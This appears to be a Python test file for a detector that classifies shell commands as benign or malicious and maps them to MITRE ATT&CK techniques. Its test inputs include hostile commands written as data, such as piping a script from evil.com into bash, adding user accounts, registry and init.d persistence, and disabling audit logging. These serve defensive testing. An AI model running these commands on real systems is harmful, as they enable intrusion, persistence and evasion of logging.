"""
test_variant_a_inference.py — Runtime verification for Variant A + soft-prior inference.

Tests fall into two layers:
  FAST  — no model load, validates pipeline logic in isolation
  FULL  — loads specialist_residual_a.pt and runs end-to-end scan

Run all:
    python3 scripts/benchmark/test_variant_a_inference.py

Run fast only:
    python3 scripts/benchmark/test_variant_a_inference.py --fast

Run with pytest:
    pytest scripts/benchmark/test_variant_a_inference.py -v
"""

import argparse
import os
import sys
import traceback

BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
PARSER_DIR = os.path.join(BASE_DIR, "parser")
sys.path.insert(0, BASE_DIR)
sys.path.insert(0, PARSER_DIR)

# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

_PASS = 0
_FAIL = 0
_results = []


def check(name, condition, detail=""):
    global _PASS, _FAIL
    if condition:
        _PASS += 1
        _results.append(f"  PASS  {name}")
    else:
        _FAIL += 1
        _results.append(f"  FAIL  {name}" + (f"\n        {detail}" if detail else ""))


def section(title):
    _results.append(f"\n── {title} {'─'*(60-len(title))}")


# ─────────────────────────────────────────────────────────────────────────────
# FAST TESTS — no model required
# ─────────────────────────────────────────────────────────────────────────────

def test_variant_a_text_format():
    """Verify _build_variant_a_text output matches training format exactly."""
    section("Variant A text format")

    from parser import parse_command
    from semantic_features import build_semantic_features
    from rule_engine import build_rule_result
    from build_residual_dataset import build_residual, build_feature_tags

    cmds = [
        "net user hacker Pass1234 /add",
        "certutil -decode input.b64 output.exe",
        "echo hello",
    ]

    for cmd in cmds:
        parsed = parse_command(cmd)
        sem = build_semantic_features(parsed)
        rules = build_rule_result(parsed, sem)
        residual = build_residual(parsed, sem, rules)
        feature_tags = build_feature_tags(sem, rules)
        parts = [f"RAW: {cmd}", f"RESIDUAL: {residual}"]
        if feature_tags:
            parts.append(f"FEATURES: {' '.join(feature_tags)}")
        text = "\n".join(parts)

        check(f"starts with 'RAW: '  [{cmd[:40]}]",
              text.startswith("RAW: "), f"got: {text[:60]!r}")
        check(f"contains '\\nRESIDUAL: '  [{cmd[:40]}]",
              "\nRESIDUAL: " in text, f"got: {text!r}")
        if feature_tags:
            check(f"contains '\\nFEATURES: '  [{cmd[:40]}]",
                  "\nFEATURES: " in text, f"got: {text!r}")
        check(f"RAW field equals cmd  [{cmd[:40]}]",
              text.split("\n")[0] == f"RAW: {cmd}")


def test_alpha_buckets():
    """Verify soft prior alpha values by rule_strength bucket."""
    section("Alpha bucket logic")

    from candidate_mask import build_prior_vector, DEFAULT_ALPHA

    check("DEFAULT_ALPHA strong == 2.0", DEFAULT_ALPHA["strong"] == 2.0,
          f"got {DEFAULT_ALPHA['strong']}")
    check("DEFAULT_ALPHA weak == 1.5",   DEFAULT_ALPHA["weak"] == 1.5,
          f"got {DEFAULT_ALPHA['weak']}")
    check("DEFAULT_ALPHA none == 0.0",   DEFAULT_ALPHA["none"] == 0.0,
          f"got {DEFAULT_ALPHA['none']}")

    # none bucket → all zeros
    none_result = {"rule_strength": "none", "priors": {"defense_evasion:modify_registry": 0.5},
                   "candidate_classes": [], "fired_rules": []}
    pv_none = build_prior_vector(none_result, {"T1112": 0, "T1059": 1})
    check("none bucket: prior_vector is all zeros",
          all(v == 0.0 for v in pv_none["prior_vector"]),
          f"got: {pv_none['prior_vector']}")
    check("none bucket: alpha == 0.0", pv_none["alpha"] == 0.0)

    # strong bucket → non-zero
    strong_result = {"rule_strength": "strong", "priors": {"defense_evasion:modify_registry": 0.4},
                     "candidate_classes": [], "fired_rules": []}
    pv_strong = build_prior_vector(strong_result, {"T1112": 0, "T1059": 1})
    check("strong bucket: alpha == 2.0", pv_strong["alpha"] == 2.0)
    check("strong bucket: T1112 prior > 0",
          pv_strong["prior_vector"][0] > 0,
          f"got: {pv_strong['prior_vector'][0]}")

    # weak bucket
    weak_result = {"rule_strength": "weak", "priors": {"execution:command_and_scripting_interpreter": 0.25},
                   "candidate_classes": [], "fired_rules": []}
    pv_weak = build_prior_vector(weak_result, {"T1059": 0, "T1112": 1})
    check("weak bucket: alpha == 1.5", pv_weak["alpha"] == 1.5)
    check("weak bucket: T1059 prior > 0",
          pv_weak["prior_vector"][0] > 0,
          f"got: {pv_weak['prior_vector'][0]}")

    # alpha_overrides respected
    pv_override = build_prior_vector(
        strong_result, {"T1112": 0},
        alpha_overrides={"strong": 3.0, "weak": 1.0, "none": 0.0}
    )
    check("alpha_overrides: strong overridden to 3.0", pv_override["alpha"] == 3.0)


def test_boot_logon_echo_exclusion():
    """Verify echo to init.d no longer triggers _rule_boot_logon_broad."""
    section("_rule_boot_logon_broad echo exclusion")

    from parser import parse_command
    from semantic_features import build_semantic_features
    from rule_engine import build_rule_result

    # These caused breakage before the fix
    noisy_cmds = [
        'echo "### BEGIN INIT INFO" >> /etc/init.d/T1543.002',
        'echo "### END INIT INFO" >> /etc/init.d/T1543.002',
        'printf "%s\n" "description: my service" >> /etc/init.d/svc',
    ]
    for cmd in noisy_cmds:
        parsed = parse_command(cmd)
        sem = build_semantic_features(parsed)
        rules = build_rule_result(parsed, sem)
        fired = rules.get("fired_rules", [])
        check(f"echo/printf to init.d does NOT fire _rule_boot_logon_broad: {cmd[:60]}",
              "_rule_boot_logon_broad" not in fired,
              f"fired_rules: {fired}")

    # Legitimate cases should still fire
    legit_cmds = [
        ("cp malicious.sh /etc/init.d/backdoor", True),
        ("systemctl enable malware.service", True),
        ("bash -c 'echo blah >> /etc/profile.d/evil.sh'", True),
    ]
    for cmd, should_fire in legit_cmds:
        parsed = parse_command(cmd)
        sem = build_semantic_features(parsed)
        rules = build_rule_result(parsed, sem)
        fired = rules.get("fired_rules", [])
        check(f"legitimate autostart still fires _rule_boot_logon_broad: {cmd[:60]}",
              ("_rule_boot_logon_broad" in fired) == should_fire,
              f"fired_rules: {fired}")


def test_registry_priors():
    """Verify refined registry prior mapping: query→T1012, write→T1112."""
    section("Registry prior mapping (refined)")

    from parser import parse_command
    from semantic_features import build_semantic_features
    from rule_engine import build_rule_result
    from candidate_mask import build_prior_vector

    spec_map = {"T1012": 0, "T1112": 1, "T1547": 2, "T1059": 3}

    # Query should promote T1012, not T1112
    query_cmd = "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion"
    parsed = parse_command(query_cmd)
    sem = build_semantic_features(parsed)
    rules = build_rule_result(parsed, sem)
    pv = build_prior_vector(rules, spec_map)
    check("reg query: _rule_registry_broad fires",
          "_rule_registry_broad" in rules.get("fired_rules", []))
    check("reg query: T1012 prior >= T1112 prior",
          pv["raw_prior"][0] >= pv["raw_prior"][1],
          f"T1012={pv['raw_prior'][0]:.3f}, T1112={pv['raw_prior'][1]:.3f}")

    # autorun write should go through _rule_registry_persistence → T1547
    autorun_cmd = 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d evil.exe'
    parsed2 = parse_command(autorun_cmd)
    sem2 = build_semantic_features(parsed2)
    rules2 = build_rule_result(parsed2, sem2)
    check("autorun write: _rule_registry_persistence fires",
          "_rule_registry_persistence" in rules2.get("fired_rules", []))


def test_no_hard_masking():
    """Verify prior vector never sets any class to a large negative value."""
    section("No hard masking in prior vector")

    from parser import parse_command
    from semantic_features import build_semantic_features
    from rule_engine import build_rule_result
    from candidate_mask import build_prior_vector

    spec_map = {f"T{i:04d}": i for i in range(108)}  # dummy 108-class map

    test_cmds = [
        "cmd.exe /c net user admin Pass1 /add",
        "reg export HKLM\\security %temp%\\sec",
        "schtasks /create /sc daily /tn evil /tr evil.exe",
    ]
    for cmd in test_cmds:
        parsed = parse_command(cmd)
        sem = build_semantic_features(parsed)
        rules = build_rule_result(parsed, sem)
        pv = build_prior_vector(rules, spec_map)
        min_val = min(pv["prior_vector"])
        check(f"no negative prior values: {cmd[:50]}",
              min_val >= 0.0, f"min={min_val}")


def test_soft_label_projection_order():
    """Verify evidence-schema soft targets project into the model label order correctly."""
    section("Soft-label projection order")

    from scripts.training.trainer1 import (
        EVIDENCE_LABEL_NAMES,
        LABEL_NAMES,
        hard_label_to_soft_target,
        normalize_soft_target,
        soft_target_to_auxiliary_targets,
    )

    check(
        "model label order is Benign/Malicious/Context_Dependent",
        LABEL_NAMES == ["Benign", "Malicious", "Context_Dependent"],
        f"got: {LABEL_NAMES}",
    )
    check(
        "evidence label order is Routine_Operational/Direct_Abuse/Needs_Context",
        EVIDENCE_LABEL_NAMES == ["Routine_Operational", "Direct_Abuse", "Needs_Context"],
        f"got: {EVIDENCE_LABEL_NAMES}",
    )

    routine_target = normalize_soft_target(
        {
            "Routine_Operational": 0.90,
            "Needs_Context": 0.10,
            "Direct_Abuse": 0.00,
        },
        row_idx=1,
        source_path="projection_test",
    )
    context_target = normalize_soft_target(
        {
            "Routine_Operational": 0.15,
            "Needs_Context": 0.80,
            "Direct_Abuse": 0.05,
        },
        row_idx=2,
        source_path="projection_test",
    )
    abuse_target = normalize_soft_target(
        {
            "Routine_Operational": 0.00,
            "Needs_Context": 0.05,
            "Direct_Abuse": 0.95,
        },
        row_idx=3,
        source_path="projection_test",
    )

    check("Routine_Operational projects to Benign index",
          routine_target == [0.9, 0.0, 0.1],
          f"got: {routine_target}")
    check("Needs_Context projects to Context_Dependent index",
          context_target == [0.15, 0.05, 0.8],
          f"got: {context_target}")
    check("Direct_Abuse projects to Malicious index",
          abuse_target == [0.0, 0.95, 0.05],
          f"got: {abuse_target}")

    non_benign, malicious_given_non_benign, ordinal_risk = soft_target_to_auxiliary_targets(context_target)
    check("context-heavy target projects to non-benign auxiliary",
          abs(non_benign - 0.85) < 1e-6,
          f"got: {non_benign}")
    check("context-heavy target projects to malicious-given-non-benign auxiliary",
          abs(malicious_given_non_benign - (0.05 / 0.85)) < 1e-6,
          f"got: {malicious_given_non_benign}")
    check("context-heavy target projects to ordinal risk auxiliary",
          abs(ordinal_risk - 0.45) < 1e-6,
          f"got: {ordinal_risk}")

    check("hard label Benign still maps to one-hot soft target",
          hard_label_to_soft_target("Benign") == [1.0, 0.0, 0.0])
    check("hard label Malicious still maps to one-hot soft target",
          hard_label_to_soft_target("Malicious") == [0.0, 1.0, 0.0])
    check("hard label Context_Dependent still maps to one-hot soft target",
          hard_label_to_soft_target("Context_Dependent") == [0.0, 0.0, 1.0])


# ─────────────────────────────────────────────────────────────────────────────
# FULL TESTS — loads model from disk
# ─────────────────────────────────────────────────────────────────────────────

def test_engine_loads_correct_checkpoint():
    """Verify GenosEngine loads specialist_residual_a.pt by default."""
    section("Engine checkpoint / config")

    from engine import GenosEngine, _RESIDUAL_PIPELINE_AVAILABLE

    check("Residual pipeline available",
          _RESIDUAL_PIPELINE_AVAILABLE,
          "parser/ imports failed — check sys.path")

    engine = GenosEngine()  # default t2_path = specialist_residual_a.pt

    check("use_residual_format is True",
          engine.use_residual_format,
          f"got: {engine.use_residual_format}")

    check("prior_alphas strong == 2.0",
          engine.prior_alphas.get("strong") == 2.0)
    check("prior_alphas weak == 1.5",
          engine.prior_alphas.get("weak") == 1.5)
    check("prior_alphas none == 0.0",
          engine.prior_alphas.get("none") == 0.0)

    check("specialist_map_fwd is non-empty",
          len(engine._specialist_map_fwd) > 0,
          f"size: {len(engine._specialist_map_fwd)}")

    check("specialist_map_fwd values are ints",
          all(isinstance(v, int) for v in engine._specialist_map_fwd.values()))

    # Check checkpoint class count matches map size
    import torch
    ckpt_path = os.path.join(BASE_DIR, "models", "specialist_residual_a.pt")
    if os.path.exists(ckpt_path):
        state = torch.load(ckpt_path, map_location="cpu", weights_only=True)
        ckpt_classes = state["classifier.4.bias"].shape[0]
        map_classes = len(engine.s_map)
        check(f"checkpoint classes ({ckpt_classes}) == map size ({map_classes})",
              ckpt_classes == map_classes)

    return engine


def test_variant_a_text_via_engine(engine):
    """Verify engine._build_variant_a_text produces correct format."""
    section("Engine._build_variant_a_text")

    cmd = "certutil -decode payload.b64 payload.exe"
    text, rule_result = engine._build_variant_a_text(cmd)

    check("text starts with 'RAW: '", text.startswith("RAW: "))
    check("text contains '\\nRESIDUAL: '", "\nRESIDUAL: " in text)
    check("RAW: line equals input cmd", text.split("\n")[0] == f"RAW: {cmd}")
    check("rule_result has rule_strength key", "rule_strength" in rule_result)
    check("rule_result strength is valid",
          rule_result["rule_strength"] in {"strong", "weak", "none"})


def test_scan_produces_mitre_codes(engine):
    """End-to-end scan should return MITRE codes for a known-malicious command."""
    section("End-to-end scan (malicious command)")

    # Use a command from the real test set that reliably triggers the gatekeeper
    cmd = 'auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable'
    result = engine.scan(cmd)

    check("scan returns dict", isinstance(result, dict))
    check("label key present", "label" in result)
    check("malicious command classified as Malicious",
          result.get("label") == "Malicious",
          f"got label: {result.get('label')}")
    check("MITRE_codes key present for malicious",
          "MITRE_codes" in result,
          f"keys: {list(result.keys())}")

    if "MITRE_codes" in result:
        codes = result["MITRE_codes"]
        check("MITRE_codes is non-empty list", isinstance(codes, list) and len(codes) > 0)
        check("top prediction has 'code' key", "code" in codes[0])
        check("top prediction has 'confidence' key", "confidence" in codes[0])
        check("confidence is > 0", codes[0].get("confidence", 0) > 0)


def test_scan_none_bucket_no_prior_effect(engine):
    """For a command with no rules, prior alpha must be 0.0 (no prior signal)."""
    section("None-bucket: alpha=0.0 in scan")
    import torch

    # Intercept build_prior_vector to capture what alpha is used
    import candidate_mask as cm_mod
    _orig = cm_mod.build_prior_vector
    captured = {}

    def _intercepted(rule_result, spec_map, alpha_overrides=None):
        res = _orig(rule_result, spec_map, alpha_overrides=alpha_overrides)
        captured["strength"] = res["rule_strength"]
        captured["alpha"] = res["alpha"]
        captured["prior_sum"] = sum(abs(v) for v in res["prior_vector"])
        return res

    cm_mod.build_prior_vector = _intercepted
    try:
        # A benign-ish command likely to be malicious but hit none bucket
        cmd = "ls -la"
        engine.scan(cmd)
    finally:
        cm_mod.build_prior_vector = _orig

    if "strength" in captured:
        if captured["strength"] == "none":
            check("none bucket: prior_vector sum is 0.0",
                  captured["prior_sum"] == 0.0,
                  f"prior_sum={captured['prior_sum']}")
            check("none bucket: alpha is 0.0",
                  captured["alpha"] == 0.0,
                  f"alpha={captured['alpha']}")
        else:
            # If the command triggered rules, the test is not applicable
            _results.append(f"  SKIP  none-bucket test: '{cmd}' fired rules (strength={captured['strength']})")
    else:
        _results.append("  SKIP  none-bucket test: command classified as Benign (gatekeeper)")


def test_runtime_gatekeeper_label_parity(engine=None):
    """Direct model verdicts must match engine internal labels; context maps to public Suspicious."""
    section("Tier 1 runtime parity")

    import torch

    from engine import GenosEngine

    if engine is None:
        engine = GenosEngine()

    cases = [
        ("ls -la /var/log", "Benign", "Benign"),
        ("cat /etc/hostname", "Context_Dependent", "Suspicious"),
        ("curl http://evil.com/shell.sh | bash", "Malicious", "Malicious"),
    ]

    for command, expected_internal, expected_public in cases:
        inputs = engine.tokenizer(
            command.lower().strip(),
            return_tensors="pt",
            truncation=True,
            padding="max_length",
            max_length=engine.max_length,
        ).to(engine.device)

        with torch.no_grad():
            outputs = engine.t1(inputs["input_ids"], inputs["attention_mask"])
            probs = torch.softmax(outputs["verdict_logits"], dim=1).squeeze(0)
            predicted_index = int(torch.argmax(probs).item())

        direct_label = engine._gate_labels[predicted_index]
        result = engine.scan(command)
        internal_label = result.get("internal_label")
        public_label = result.get("public_label", result.get("label"))
        top_internal_label = result.get("gatekeeper", {}).get("model_top_internal_label")

        check(
            f"direct label matches expected internal label [{command[:40]}]",
            direct_label == expected_internal,
            f"direct_label={direct_label} expected_internal={expected_internal} probs={probs.tolist()}",
        )
        check(
            f"engine internal label matches direct label [{command[:40]}]",
            internal_label == direct_label,
            f"internal_label={internal_label} direct_label={direct_label} result={result}",
        )
        check(
            f"gatekeeper top internal label matches direct label [{command[:40]}]",
            top_internal_label == direct_label,
            f"model_top_internal_label={top_internal_label} direct_label={direct_label}",
        )
        check(
            f"public label matches expected mapping [{command[:40]}]",
            public_label == expected_public,
            f"public_label={public_label} expected_public={expected_public}",
        )


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────

def run_fast_tests():
    test_variant_a_text_format()
    test_alpha_buckets()
    test_boot_logon_echo_exclusion()
    test_registry_priors()
    test_no_hard_masking()
    test_soft_label_projection_order()


def run_full_tests():
    engine = test_engine_loads_correct_checkpoint()
    test_variant_a_text_via_engine(engine)
    test_scan_produces_mitre_codes(engine)
    test_scan_none_bucket_no_prior_effect(engine)
    test_runtime_gatekeeper_label_parity(engine)


# pytest-compatible functions (no args, fast only)
def test_fast_format():
    run_fast_tests()
    assert _FAIL == 0, f"{_FAIL} test(s) failed:\n" + "\n".join(
        r for r in _results if "FAIL" in r
    )


def test_runtime_gatekeeper_parity_pytest():
    test_runtime_gatekeeper_label_parity()
    assert _FAIL == 0, f"{_FAIL} test(s) failed:\n" + "\n".join(
        r for r in _results if "FAIL" in r
    )


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--fast", action="store_true", help="Run fast tests only (no model load)")
    ap.add_argument("--parity-only", action="store_true", help="Run only the Tier 1 runtime parity regression")
    args = ap.parse_args()

    W = 72
    print("=" * W)
    print("  GENOS VARIANT A INFERENCE TESTS")
    print("=" * W)

    try:
        if not args.parity_only:
            run_fast_tests()
    except Exception:
        _results.append(f"  ERROR in fast tests:\n{traceback.format_exc()}")
        _FAIL += 1

    if args.parity_only:
        print("\n[*] Loading engine for parity-only test (this may take a moment)...")
        try:
            test_runtime_gatekeeper_label_parity()
        except Exception:
            _results.append(f"  ERROR in parity test:\n{traceback.format_exc()}")
            _FAIL += 1
    elif not args.fast:
        print("\n[*] Loading engine for full tests (this may take a moment)...")
        try:
            run_full_tests()
        except Exception:
            _results.append(f"  ERROR in full tests:\n{traceback.format_exc()}")
            _FAIL += 1

    print()
    for r in _results:
        print(r)

    print()
    print("=" * W)
    total = _PASS + _FAIL
    print(f"  Result: {_PASS}/{total} passed" + (f"  ({_FAIL} FAILED)" if _FAIL else "  ✓"))
    print("=" * W)

    sys.exit(1 if _FAIL > 0 else 0)
